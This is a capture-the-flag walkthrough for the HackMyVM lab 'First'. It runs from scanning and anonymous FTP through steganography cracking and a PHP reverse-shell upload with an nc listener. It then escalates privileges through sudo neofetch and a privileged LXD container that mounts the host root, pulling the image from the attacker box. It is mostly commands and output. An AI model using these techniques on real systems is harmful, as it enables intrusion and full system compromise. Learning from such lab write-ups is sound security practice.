<h1 align="center"> First-HMV: <a href="https://hackmyvm.eu/machines/machine.php?vm=First">First</a></h1/>


## Net Discover & NMAP
 ```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/First]
└─$ sudo netdiscover -r 10.1.1.1/24 -i eth0 

 Currently scanning: 10.1.1.0/24   |   Screen View: Unique Hosts                                                                                                                                                                            
                                                                                                                                                                                                                                            
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                                                                                                            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.1.1.1        08:00:27:12:9a:21      1      60  PCS Systemtechnik GmbH                                                                                                                                                                   
 10.1.1.45       08:00:27:ba:38:13      1      60  PCS Systemtechnik GmbH  
 ```
 ```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/First]
└─$ ip=10.1.1.45 && url=http://$ip                                                                                                                         
                                                                                  
┌──(coolatos㉿CooLaToS)-[~/HMV/First]
└─$ nmap -v -T5 -p- -sC -sV -oN nmap-$ip.log $ip; clear; cat nmap-$ip.log
# Nmap 7.92 scan initiated Thu Aug 25 10:15:35 2022 as: nmap -v -T5 -p- -sC -sV -oN nmap-10.1.1.45.log 10.1.1.45
Nmap scan report for 10.1.1.45
Host is up (0.00021s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 09 10:16 fifth
| drwxr-xr-x    2 0        0            4096 Aug 10 12:44 first
| drwxr-xr-x    2 0        0            4096 Aug 09 10:16 fourth
| drwxr-xr-x    2 0        0            4096 Aug 09 10:16 seccond
|_drwxr-xr-x    2 0        0            4096 Aug 09 10:16 third
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.1.1.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b8:57:5b:81:5a:78:1f:d6:ff:60:39:bb:32:a8:5d:cd (RSA)
|   256 65:8d:43:ec:63:77:d0:39:c0:1b:3e:40:d9:53:1e:ed (ECDSA)
|_  256 0f:02:ac:df:e1:31:3c:b2:59:f6:b7:59:09:f1:ff:f8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 25 10:15:44 2022 -- 1 IP address (1 host up) scanned in 9.46 seconds
 ```
## FTP
```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/First]
└─$ ncftp $ip 
NcFTP 3.2.6 (Dec 04, 2016) by Mike Gleason (http://www.NcFTP.com/contact/).
Connecting to 10.1.1.45...                                                                                                                                                                                                                   
(vsFTPd 3.0.3)
Logging in...                                                                                                                                                                                                                                
Login successful.
Logged in to 10.1.1.45.                                                                                                                                                                                                                      
ncftp / > ls -alh
drwxr-xr-x    8 0        118          4096 Aug 10 12:44 .
drwxr-xr-x    8 0        118          4096 Aug 10 12:44 ..
drwxr-xr-x    2 0        0            4096 Aug 09 10:16 .real
drwxr-xr-x    2 0        0            4096 Aug 09 10:16 fifth
drwxr-xr-x    2 0        0            4096 Aug 10 12:44 first
drwxr-xr-x    2 0        0            4096 Aug 09 10:16 fourth
drwxr-xr-x    2 0        0            4096 Aug 09 10:16 seccond
drwxr-xr-x    2 0        0            4096 Aug 09 10:16 third
ncftp / > cd first/ 
Directory successfully changed.
ncftp /first > ls
first_Logo.jpg
ncftp /first > mget *
first_Logo.jpg:                                         32.74 kB    6.09 MB/s  
ncftp /first > exit
```
```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/First]
└─$ stegseek first_Logo.jpg                 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "firstgurl1"       
[i] Original filename: "secret.txt".
[i] Extracting to "first_Logo.jpg.out".
┌──(coolatos㉿CooLaToS)-[~/HMV/First]
└─$ cat first_Logo.jpg.out            
SGkgSSBoYWQgdG8gY2hhbmdlIHRoZSBuYW1lIG9mIHRoZSB0b2RvIGxpc3QgYmVjb3VzZSBkaXJlY3RvcnkgYnVzdGluZyBpcyB0b28gZWFzeSB0aGVlc2UgZGF5cyBhbHNvIEkgZW5jb2RlZCB0aGlzIGluIGJlc2E2NCBiZWNvdXNlIGl0IGlzIGNvb2wgYnR3IHlvdXIgdG9kbyBsaXN0IGlzIDogMmYgNzQgMzAgNjQgMzAgNWYgNmMgMzEgNzMgNzQgNWYgNjYgMzAgNzIgNWYgNjYgMzEgNzIgMzUgNzQgZG8gaXQgcXVpY2sgd2UgYXJlIHZ1bG5hcmFibGUgZG8gdGhlIGZpcnN0IGZpcnN0IA==
                                                                                                                                                                                                                                             
┌──(coolatos㉿CooLaToS)-[~/HMV/First]
└─$ cat first_Logo.jpg.out | base64 -d
Hi I had to change the name of the todo list becouse directory busting is too easy theese days also I encoded this in besa64 
becouse it is cool btw your todo list is : 
2f 74 30 64 30 5f 6c 31 73 74 5f 66 30 72 5f 66 31 72 35 74 do it quick we are vulnarable do the first first
```
## CyberChef
<h1 align="center"> CyberChef: <a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></h1/>
Recipe : From Hex (auto)
Input : 2f 74 30 64 30 5f 6c 31 73 74 5f 66 30 72 5f 66 31 72 35 74
Output : /t0d0_l1st_f0r_f1r5t

##Visiting view-source:http://10.1.1.45/

```html
todo for first:
	First: patch the buffer overflow in our secret file ;)
	2: remove the temporary upload php file
	3: put the server on the World Wide Web
	4: profit
<script>alert("DO THIS QUICK")</script>
```
This gives us a clue. Its ferox time

#FerroxBuster 
```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/First]
└─$ feroxbuster -e -x txt,php,html,zip,htm,bak,pem -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $url/t0d0_l1st_f0r_f1r5t -t 500 -o ferox-$ip-td.log

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.1.1.45/t0d0_l1st_f0r_f1r5t
 🚀  Threads               │ 500
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox-10.1.1.45-td.log
 💲  Extensions            │ [txt, php, html, zip, htm, bak, pem]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      320c http://10.1.1.45/t0d0_l1st_f0r_f1r5t => http://10.1.1.45/t0d0_l1st_f0r_f1r5t/
301      GET        9l       28w      328c http://10.1.1.45/t0d0_l1st_f0r_f1r5t/uploads => http://10.1.1.45/t0d0_l1st_f0r_f1r5t/uploads/
200      GET       13l       34w      348c http://10.1.1.45/t0d0_l1st_f0r_f1r5t/upload.php
301      GET        9l       28w      327c http://10.1.1.45/t0d0_l1st_f0r_f1r5t/photos => http://10.1.1.45/t0d0_l1st_f0r_f1r5t/photos/
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_1_1_45_t0d0_l1st_f0r_f1r5t-1661758403.state ...
[>-------------------] - 19s    26266/1764440 21m     found:4       errors:822    
[>-------------------] - 19s    30824/1764368 1557/s  http://10.1.1.45/t0d0_l1st_f0r_f1r5t 
[####################] - 0s   1764368/1764368 0/s     http://10.1.1.45/t0d0_l1st_f0r_f1r5t/uploads => Directory listing
[####################] - 0s   1764368/1764368 0/s     http://10.1.1.45/t0d0_l1st_f0r_f1r5t/photos => Directory listing
```
##Reverse Shell 
Upload shell.php to http://10.1.1.45/t0d0_l1st_f0r_f1r5t/upload.php
(I use pentestmonkey)
```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/First]
└─$ nc -nlvp 5555                                                                                                                                                                                                                        1 ⨯
listening on [any] 5555 ...
```
``bash
┌──(coolatos㉿CooLaToS)-[~/HMV/First]
└─$ curl $url/t0d0_l1st_f0r_f1r5t/uploads/shell.php
```
```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/First]
└─$ nc -nlvp 5555                                                                                                                                                                                                                        1 ⨯
listening on [any] 5555 ...
connect to [10.1.1.2] from (UNKNOWN) [10.1.1.45] 36682
Linux first 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 08:44:11 up  1:08,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
first    pts/0    10.1.1.2         07:42   38:27   0.20s  0.15s lxc exec mycontainer /bin/sh
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ 
```
##Upgrade Shell
```terminal
python3 -c 'import pty;pty.spawn("/bin/bash")'

ctrl + z 

stty -a ; stty raw -echo ; fg 

www-data@first:/$ reset
reset: unknown terminal type unknown
Terminal type? xterm

www-data@first:/$ stty rows (Values from stty raw - echo) cols (Values from stty raw - echo)
www-data@first:/$ export TERM=xterm-256color
www-data@first:/$ alias ll='clear ; ls -lsaht --color=auto'
```
```bash
www-data@first:/$ sudo -l
Matching Defaults entries for www-data on first:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on first:
    (first : first) NOPASSWD: /bin/neofetch
```

<h1 align="center"> Neofetch: <a href="https://gtfobins.github.io/gtfobins/neofetch/">https:/gtfobins.github.io/gtfobins/neofetch/</a></h1/>
What this actually do is making the neofetch run a command through its config

```bash
www-data@first:/tmp$ echo '/bin/bash' > neof
www-data@first:/tmp$ cat neof 
/bin/bash
www-data@first:/tmp$ sudo -u first neofetch --config neof 
first@first:/tmp$ cd
first@first:~$ id
uid=1000(first) gid=1000(first) groups=1000(first),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```
##LXD Privilage Escalation  
  
<h1 align="center"> LXD Priv Esc: <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></h1/>

```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/First]
└─$ git clone https://github.com/saghul/lxd-alpine-builder.git      
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 50, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42
Receiving objects: 100% (50/50), 3.11 MiB | 8.50 MiB/s, done.
Resolving deltas: 100% (15/15), done.
                                                                                                                                                                                                                                             
┌──(coolatos㉿CooLaToS)-[~/HMV/First]
└─$ cd lxd-alpine-builder          
┌──(coolatos㉿CooLaToS)-[~/HMV/First/lxd-alpine-builder]
└─$ sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
┌──(coolatos㉿CooLaToS)-[~/HMV/First/lxd-alpine-builder]
└─$ sudo ./build-alpine -a i686
┌──(coolatos㉿CooLaToS)-[~/HMV/First/lxd-alpine-builder]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
first@first:~$ wget $ip/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2022-08-29 08:01:15--  http://10.1.1.2/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 10.1.1.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’

alpine-v3.13-x86_64-20210218_0139.tar.gz                    100%[========================================================================================================================================>]   3.11M  --.-KB/s    in 0.009s  

2022-08-29 08:01:15 (362 MB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]

first@first:~$ lxc image import ./alpine*.tar.gz --alias myimage
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
first@first:~$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (btrfs, dir, lvm, zfs, ceph) [default=zfs]: 
Create a new ZFS pool? (yes/no) [default=yes]: 
Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=5GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like the LXD server to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
first@first:~$ lxc init myimage mycontainer -c security.privileged=true
Creating mycontainer
first@first:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to mycontainer
first@first:~$ lxc start mycontainer
first@first:~$ lxc exec mycontainer /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # cd /root
~ # ls
~ # cd /mnt
/mnt # ls
root
/mnt # cd root/
/mnt/root # ls
bin         dev         home        lib32       libx32      media       opt         root        sbin        srv         sys         usr
boot        etc         lib         lib64       lost+found  mnt         proc        run         snap        swap.img    tmp         var
/mnt/root # cd root/
/mnt/root/root # ls
r00t.txt  snap
/mnt/root/root # 
```
